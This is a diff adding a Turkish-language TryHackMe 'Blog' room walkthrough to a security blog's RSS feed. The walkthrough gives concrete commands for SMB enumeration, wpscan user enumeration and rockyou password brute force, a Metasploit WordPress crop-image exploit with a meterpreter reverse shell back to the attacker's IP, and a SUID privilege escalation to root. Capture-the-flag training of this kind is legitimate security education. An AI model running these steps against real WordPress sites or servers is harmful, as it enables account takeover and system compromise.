@@ -5,8 +5,219 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Tue, 06 Oct 2020 11:25:38 +0300</lastBuildDate>
+        <lastBuildDate>Wed, 07 Oct 2020 11:49:09 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM Blog Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/10/thm-blog-write-up/</link>
+            <pubDate>Wed, 07 Oct 2020 11:49:09 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/10/thm-blog-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki Blog adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
+İlk olarak tasarımcı tarafından belirtilen domain adı /etc/hosts dosyasına eklenir.
+1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
+sudo nmap -sV -sC 10.10.25.92  Samba servisinde anonymous olarak paylaşıma açık olan dizinler kontrol edilir.
+─[barcode@parrot]─[~]$ smbclient -L //10.10.25.92 Enter WORKGROUP\barcode&amp;#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy&amp;#39;s local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available BillySMB klasörü içeriğine bakılır.</description>
+            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/blog">Blog</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</p>
+<p>İlk olarak tasarımcı tarafından belirtilen domain adı /etc/hosts dosyasına eklenir.</p>
+
+    <img src="/images/thm/blog/desc.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.25.92 
+</code></pre></div>
+    <img src="/images/thm/blog/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Samba servisinde anonymous olarak paylaşıma açık olan dizinler kontrol edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">─[barcode@parrot]─[~]$ smbclient -L //10.10.25.92
+Enter WORKGROUP\barcode&#39;s password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	BillySMB        Disk      Billy&#39;s local SMB Share
+	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+</code></pre></div><p>BillySMB klasörü içeriğine bakılır. Paylaşıma açık olan dosyalar <strong>get</strong> komutu ile indirilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">─[barcode@parrot]─[~]$ smbclient  //10.10.25.92/BillySMB
+Enter WORKGROUP\barcode&#39;s password: 
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue May 26 13:17:05 2020
+  ..                                  D        0  Tue May 26 12:58:23 2020
+  Alice-White-Rabbit.jpg              N    33378  Tue May 26 13:17:01 2020
+  tswift.mp4                          N  1236733  Tue May 26 13:13:45 2020
+  check-this.png                      N     3082  Tue May 26 13:13:43 2020
+
+		15413192 blocks of size 1024. 9788764 blocks available
+smb: \&gt; get Alice-White-Rabbit.jpg 
+getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (30.9 KiloBytes/sec) (average 30.9 KiloBytes/sec)
+smb: \&gt; get tswift.mp4 
+getting file \tswift.mp4 of size 1236733 as tswift.mp4 (871.4 KiloBytes/sec) (average 508.1 KiloBytes/sec)
+smb: \&gt; get check-this.png 
+getting file \check-this.png of size 3082 as check-this.png (9.9 KiloBytes/sec) (average 453.0 KiloBytes/sec)
+</code></pre></div><p><em>Alice-White-Rabbit.jpg</em> dosyasında gizli bir mesaj olduğu steghide aracı ile tespit edilir. Daha sonra yine aynı araç ile rabbit_hole.txt dosyası export edilir.</p>
+<pre><code class="language-terminal" data-lang="terminal">─[barcode@parrot]─[~]$ steghide extract -sf Alice-White-Rabbit.jpg 
+Enter passphrase: 
+wrote extracted data to &quot;rabbit_hole.txt&quot;.
+</code></pre><p>İçeriğine bakıldığında tuzak olduğu görülmektedir. 😥</p>
+<pre><code class="language-terminal" data-lang="terminal">─[barcode@parrot]─[~]$ cat rabbit_hole.txt 
+You've found yourself in a rabbit hole, friend.
+</code></pre><p>Araştırmalara Web servisi üzerinden devam edilir. 80. portta Wordpress uygulaması çalışmaktadır.</p>
+
+    <img src="/images/thm/blog/webpage.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Robots.txt dosyası içeriğine bakılır.</p>
+
+    <img src="/images/thm/blog/robots.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Wordpress uygulamalarında kolaylıkla bilgi toplamamızı sağlayan wpscan aracı ile tarama yapılır. Tarama sonucunda dikkat çeken bilgiler aşağıdadır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://blog.thm --enumerate
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">
+[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://blog.thm/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;
+ |  - http://blog.thm/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;
+
+[i] User(s) Identified:
+
+[+] kwheel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] bjoel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+</code></pre><p>Wordpress sürümü ile ilgili exploit araştırması yapıldığında düşük kullanıcı ile shell upload edilebilcek bir zafiyet tespit edilmektedir.</p>
+
+    <img src="/images/thm/blog/exp.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Exploitin kullanımı için kullanıcı hesap bilgilerine ihtiyaç vardır. Wpscan aracı ile elde edilen hesaplara brute force saldırısı düzenlenir. İşlem soncunda kwhell adlı kullanıcıya ait parola elde edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://blog.thm -U user.lst -P /usr/share/wordlists/rockyou.txt
+</code></pre></div>
+    <img src="/images/thm/blog/pass.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Metasploit aracı açılır ve tespit edilen exploit modulü aranır. Seçilen modüle ait ayarlar options komutu görüntülenir.</p>
+<p><em>Not: Metasploit 6 sürümünde exploit işleminden sonra shell almada sıkıntılar olmaktadır.</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">msf5 &gt; search crop-image
+
+Matching Modules
+================
+
+   #  Name                            Disclosure Date  Rank       Check  Description
+   -  ----                            ---------------  ----       -----  -----------
+   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
+
+
+msf5 &gt; use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf5 exploit(multi/http/wp_crop_rce) &gt; options
+
+Module options (exploit/multi/http/wp_crop_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   USERNAME                    yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+
+</code></pre></div><p>Exploitin kullanımı için zorunlu parametlere set edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">&gt; set password *********
+&gt; set username kwheel
+&gt; set rhosts 10.10.25.92
+&gt; set lhost 10.9.62.67
+</code></pre></div><h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Run/Exploit komutu ile meterpreter oturumu elde edilmiş olur.</p>
+<p><em>/home/bjoel</em> dizin içeriği kontrol edildiğinde user.txt dosyası görülmektedir.</p>
+
+    <img src="/images/thm/blog/home.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>İçerik görüntülendiğinde tam bir hayal kırılığıdır. 😭</p>
+
+    <img src="/images/thm/blog/fake.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><code>shell</code> komutu ile meterpreter oturumdan normal terminal oturumuna geçilir. Sistem genelinde user.txt araması yapıldığında başka dosya bulunamaz. User.txt dosyası yüksek kullanıcı erişimine sahip bir dizin içerisinde yer almaktadır.</p>
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Yetki yükseltmek için suid biti aktif dosyalar tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</code></pre></div>
+    <img src="/images/thm/blog/suid.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><em><strong>/usr/sbin/checker</strong></em> uygulaması dikkat çekmektedir. Uygulama çalıştırıldığında <mark>Not an Admin </mark> hatası vermektedir. Uygulamanın işleyişinin daha iyi anlaşılabilmesi için uygulama home dizinine kopyalanır ve tersine mühendislik araçları ile incelenmek üzere locale indirilir.</p>
+<blockquote>
+<p>Not: Home dizininde <code>python2 -m SimpleHTTPServer 8000</code> komutu çalıştılır. İster tarayıcıdan ister curl, wget gibi araçlarla dosya indirilebilir.</p>
+</blockquote>
+<p>Ghridra ile binary analiz edilir. <em><strong>getenv(&ldquo;parametre&rdquo;)</strong></em> fonksiyonu parametre aldığı değeri ortam değişkenleri içerisinde arar varsa değerini döndürür. <em>Admin değişkeni varsa uid değeri 0 (root) olarak set edilir ve /bin/bash başlatılır.</em></p>
+
+    <img src="/images/thm/blog/ghidra.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Burada <em>admin</em> değeri ortam değişkeninleri içerisinde aranmaktadır. Bypass için <code>export</code> komutu ile admin değişkeni tanımlanır ve rastgele bir değer atanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export admin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>
+</code></pre></div><p><em>/usr/sbin/checker</em> uygulaması çalıştırıldığında root yetkisi ile shell oturumu elde edilir.</p>
+<pre><code class="language-terminal" data-lang="terminal">/usr/sbin/checker
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+</code></pre><p>Root dizini altında yer alan root.txt okunur.</p>
+
+    <img src="/images/thm/blog/root.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>User.txt için <code>find</code> komutu ile arama yapıldığında /media/usb/ dizini altında bulunur.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find -name <span style="color:#e6db74">&#39;user.txt&#39;</span> 2&gt;/dev/null
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">/home/bjoel/user.txt
+/media/usb/user.txt
+</code></pre>
+    <img src="/images/thm/blog/user.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+]]></content>
+        </item>
         
         <item>
             <title>VULNHUB Symfonos-2 Write Up</title>
